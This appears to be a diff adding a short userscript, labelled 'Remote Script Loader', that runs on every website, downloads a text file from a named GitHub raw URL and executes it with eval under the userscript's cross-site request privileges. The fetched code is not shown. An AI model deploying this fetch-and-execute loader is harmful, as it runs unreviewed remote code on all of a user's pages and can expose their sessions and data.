@@ -1,0 +1,34 @@
+// ==UserScript==
+// @name         Remote Script Loader
+// @namespace    https://example.com
+// @version      1.0
+// @description  Load and execute a script from a remote source
+// @author       Your Name
+// @match        *://*/*
+// @grant        GM_xmlhttpRequest
+// @connect      raw.githubusercontent.com
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // URL of the script you want to load
+    const scriptUrl = 'https://raw.githubusercontent.com/Mazen1110/book/refs/heads/main/GM.txt';
+
+    // Fetch the script using GM_xmlhttpRequest
+    GM_xmlhttpRequest({
+        method: 'GET',
+        url: scriptUrl,
+        onload: function(response) {
+            if (response.status === 200) {
+                // Execute the fetched script
+                eval(response.responseText);
+            } else {
+                console.error('Failed to load script:', response.status, response.statusText);
+            }
+        },
+        onerror: function() {
+            console.error('Error while trying to fetch the script');
+        }
+    });
+})();
